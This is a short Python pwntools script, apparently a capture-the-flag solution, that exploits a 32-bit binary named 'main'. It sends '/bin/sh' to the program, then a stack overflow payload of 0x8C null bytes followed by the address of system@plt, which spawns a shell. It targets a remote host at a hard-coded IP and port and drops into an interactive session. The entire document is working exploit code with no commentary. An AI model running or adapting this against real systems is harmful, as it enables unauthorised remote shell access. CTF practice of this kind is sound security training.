from pwn import*
p = process('./main')
p = remote('39.101.210.214',10009)
elf =ELF('./main')
p.sendafter('argument?','/bin/sh\x00')
p.sendlineafter('Name','\x00'*0x8C + p32(elf.plt['system']) + p32(0) + p32(0x804C00C))
p.interactive()
